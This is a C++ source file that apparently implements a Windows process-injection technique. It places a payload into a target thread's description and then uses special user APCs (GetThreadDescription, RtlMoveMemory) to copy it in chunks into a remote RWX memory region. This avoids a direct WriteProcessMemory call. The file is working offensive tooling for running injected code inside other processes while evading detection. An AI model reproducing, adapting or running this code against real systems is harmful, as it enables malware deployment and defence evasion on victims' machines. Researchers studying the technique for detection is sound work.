#include <iostream>
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <iomanip>

using namespace std;

typedef PVOID PPS_APC_ROUTINE;

typedef NTSTATUS(NTAPI* pNtQueueApcThreadEx2_FIXED)(
    _In_ HANDLE ThreadHandle,
    _In_opt_ HANDLE ReserveHandle,
    _In_ ULONG ApcFlags,
    _In_ PPS_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcArgument1,
    _In_opt_ PVOID ApcArgument2,
    _In_opt_ PVOID ApcArgument3
    );

typedef NTSTATUS(WINAPI* PFN_NT_QUERY_SYSTEM_INFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

using resolvedNtQueueApcThreadEx2 = NTSTATUS(NTAPI*)(
    HANDLE ThreadHandle,
    HANDLE ReserveHandle,
    ULONG ApcFlags,
    PPS_APC_ROUTINE ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
    );

// Helper function to print addresses in both standard and x64dbg formats
void print_address(const char* label, ULONG_PTR address)
{
    cout << label << ":\n";
    cout << "    Standard : 0x" << hex << uppercase << address << "\n";

    // x64dbg format: always 16 hex digits, padded with zeros
    cout << "    x64dbg   : ";
    cout << setfill('0') << setw(16) << hex << uppercase << address << "\n";
    cout << dec << setfill(' '); // reset
}

bool _NtQueueApcThreadEx2(HANDLE hThread, void* func, void* arg0, void* arg1, void* arg2)
{
    resolvedNtQueueApcThreadEx2 fNtQueueApcThreadEx2 = (resolvedNtQueueApcThreadEx2)(GetProcAddress(GetModuleHandleA("ntdll"), "NtQueueApcThreadEx2"));

    DWORD res = fNtQueueApcThreadEx2(hThread, NULL, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, (PPS_APC_ROUTINE)func, (void*)arg0, (void*)arg1, (arg2));
    return true;
}

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)

ULONG_PTR GetRemotePEBAddr(IN HANDLE hProcess)
{
    PROCESS_BASIC_INFORMATION pi = { 0 };
    DWORD ReturnLength = 0;

    auto pNtQueryInformationProcess = reinterpret_cast<decltype(&NtQueryInformationProcess)>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryInformationProcess"));
    if (!pNtQueryInformationProcess) {
        return NULL;
    }
    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    return (ULONG_PTR)pi.PebBaseAddress;
}

void* getPEBUnused(HANDLE hProcess)
{
    ULONG_PTR peb_addr = GetRemotePEBAddr(hProcess);
    if (!peb_addr) {
        std::cerr << "Cannot retrieve PEB address!\n";
        return nullptr;
    }
    const ULONG_PTR UNUSED_OFFSET = 0x340;
    const ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;
    return (void*)remotePtr;
}

// Case-insensitive string comparison helper
bool CaseInsensitiveCompare(const std::wstring& str1, const std::wstring& str2) {
    if (str1.length() != str2.length()) {
        return false;
    }
    return _wcsicmp(str1.c_str(), str2.c_str()) == 0;
}

DWORD GetPIDByProcname(const std::wstring& processName) {
    // Load ntdll.dll and get NtQuerySystemInformation
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return 0;
    }

    PFN_NT_QUERY_SYSTEM_INFORMATION NtQuerySystemInformation =
        (PFN_NT_QUERY_SYSTEM_INFORMATION)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!NtQuerySystemInformation) {
        return 0;
    }

    // Start with an initial buffer size
    ULONG bufferSize = 0x10000; // 64KB initial size
    std::vector<BYTE> buffer;
    NTSTATUS status;

    // Query with increasing buffer size until successful
    do {
        buffer.resize(bufferSize);
        status = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.data(),
            bufferSize,
            &bufferSize
        );

        if (status == 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
            bufferSize *= 2;
        }
    } while (status == 0xC0000004 && bufferSize <= 0x1000000); // Max 16MB

    if (status != 0) { // STATUS_SUCCESS
        return 0;
    }

    // Iterate through processes
    PSYSTEM_PROCESS_INFORMATION processInfo = (PSYSTEM_PROCESS_INFORMATION)buffer.data();

    while (true) {
        if (processInfo->ImageName.Buffer != nullptr) {
            std::wstring currentProcessName(
                processInfo->ImageName.Buffer,
                processInfo->ImageName.Length / sizeof(WCHAR)
            );

            // Case-insensitive comparison
            if (CaseInsensitiveCompare(currentProcessName, processName)) {
                return (DWORD)(ULONG_PTR)processInfo->UniqueProcessId;
            }
        }
        // Move to next process
        if (processInfo->NextEntryOffset == 0) {
            break;
        }
        processInfo = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)processInfo + processInfo->NextEntryOffset);
    }

    return 0; // Process not found
}

HANDLE findThread(HANDLE hProcess, DWORD desiredAccess) {
    DWORD pid = GetProcessId(hProcess);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    if (!Thread32First(hSnapshot, &te32)) {
        CloseHandle(hSnapshot);
        return INVALID_HANDLE_VALUE;
    }
    do {
        if (te32.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(desiredAccess, FALSE, te32.th32ThreadID);
            if (hThread) {
                CloseHandle(hSnapshot);
                return hThread;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));
    CloseHandle(hSnapshot);
    return INVALID_HANDLE_VALUE;
}




HRESULT mySetThreadDescription(HANDLE hThread, const BYTE* buf, size_t buf_size)
{
    typedef NTSTATUS(NTAPI* pRtlInitUnicodeStringEx)(
        PUNICODE_STRING DestinationString,
        PCWSTR SourceString
        );
    typedef NTSTATUS(NTAPI* pNtSetInformationThread)(
        HANDLE ThreadHandle,
        THREADINFOCLASS ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength
        );

    UNICODE_STRING DestinationString = { 0 };

    // Create temporary buffer without null bytes
    BYTE* padding = (BYTE*)calloc(buf_size + sizeof(WCHAR), 1);
    if (!padding) return E_OUTOFMEMORY;
    memset(padding, 'A', buf_size);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    auto _RtlInitUnicodeStringEx = (pRtlInitUnicodeStringEx)GetProcAddress(hNtdll, "RtlInitUnicodeStringEx");
    auto _NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(hNtdll, "NtSetInformationThread");

    if (!_RtlInitUnicodeStringEx || !_NtSetInformationThread) {
        free(padding);
        return E_FAIL;
    }

    // Initialize with padding
    _RtlInitUnicodeStringEx(&DestinationString, (PCWSTR)padding);

    // Overwrite with real payload (including null bytes)
    memcpy(DestinationString.Buffer, buf, buf_size);

    // Call NtSetInformationThread directly
    const THREADINFOCLASS ThreadNameInformation = (THREADINFOCLASS)0x26;
    NTSTATUS status = _NtSetInformationThread(
        hThread,
        ThreadNameInformation,
        &DestinationString,
        0x10
    );

    /* NTSTATUS status = _NtSetInformationThread(
        hThread,
        ThreadNameInformation,
        &DestinationString,
        sizeof(UNICODE_STRING)
    );*/

    free(padding);
    return HRESULT_FROM_NT(status);
}



LPVOID CustomWriteProcessMemory(HANDLE hProcess, BYTE* payload, size_t payload_size, LPVOID remotePtr, HANDLE hThread, LPVOID rwx) {
    // FUNCTION RESOLUTION (your original API loading code)
    // ---------------------------------------------------------
    // Assuming these global variables or helper functions are defined elsewhere:
    // pReadProcessMemory, getFunctionAddressByHash, _NtQueueApcThreadEx2, CW_STR, etc.
    // Cleaned up a bit to focus on the loop logic.
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    void* pRtlMoveMemory = (void*)GetProcAddress(hNtdll, "RtlMoveMemory");
    if (!pRtlMoveMemory) return nullptr;

    // ---------------------------------------------------------
    // CHUNKING LOOP LOGIC
    // ---------------------------------------------------------
    // Define a safe block size.
    // Must be LESS than 65535. Using 0x8000 (32768 bytes) for safety margin.
    //const size_t MAX_BLOCK_SIZE = 0x8000;

    // 49,152
    //const size_t MAX_BLOCK_SIZE = 0xC000;

    // 61,440
    const size_t MAX_BLOCK_SIZE = 0xF000;

    size_t bytesWritten = 0;

    while (bytesWritten < payload_size) {
        // 1. Calculate current chunk size
        size_t remaining = payload_size - bytesWritten;
        size_t currentChunkSize = (remaining > MAX_BLOCK_SIZE) ? MAX_BLOCK_SIZE : remaining;

        // Pointer to the start of the current chunk in YOUR memory
        BYTE* currentPayloadPtr = payload + bytesWritten;

        // Pointer to the destination in REMOTE memory (advancing the rwx pointer)
        void* currentRemoteDest = (BYTE*)rwx + bytesWritten;

        std::cout << "[*] Processing chunk: " << currentChunkSize << " bytes..." << std::endl;

        // 2. Use your original function to set this chunk in the thread description
        HRESULT hr = mySetThreadDescription(hThread, currentPayloadPtr, currentChunkSize);
        if (FAILED(hr)) {
            std::cerr << "SetThreadDescription failed on chunk! HR: " << std::hex << hr << "\n";
            return nullptr;
        }

        // 3. Queue APC #1: Force the process to allocate the description and write the address to remotePtr
        if (!_NtQueueApcThreadEx2(hThread, GetThreadDescription, (void*)NtCurrentThread(), remotePtr, nullptr)) {
            std::cerr << "Failed to queue GetThreadDescription APC\n";
            return nullptr;
        }

        // Important: Wait for the APC to execute.
        Sleep(10000);

        // 4. Read where the OS stored our chunk (ReadProcessMemory)
        ULONG_PTR realPayloadPtr = 0;

        // Your retry logic would go here if needed...
        if (!ReadProcessMemory(hProcess, remotePtr, &realPayloadPtr, sizeof(realPayloadPtr), nullptr)) {
            std::cerr << "Failed to read ptr inside loop. GLE: " << GetLastError() << "\n";
            return nullptr;
        }

        if (!realPayloadPtr) {
            std::cerr << "Ptr is NULL inside loop.\n";
            return nullptr;
        }

        // 5. Queue APC #2: Move memory from description (realPayloadPtr) to final destination (rwx + offset)
        if (!_NtQueueApcThreadEx2(hThread, pRtlMoveMemory, currentRemoteDest, (void*)realPayloadPtr, (void*)currentChunkSize)) {
            std::cerr << "Failed to queue memcpy APC\n";
            return nullptr;
        }

        // Advance counters
        bytesWritten += currentChunkSize;

        // Small pause to ensure memcpy happens before overwriting description next iteration
        Sleep(1000);
    }

    std::cout << "[+] All chunks staged. Waiting for nexts steps..." << std::endl;

    // Optional final sleep
    Sleep(5000);
    // Return the base RWX address (realPayloadPtr changes each iteration so it's not valid at the end)
    return rwx;
}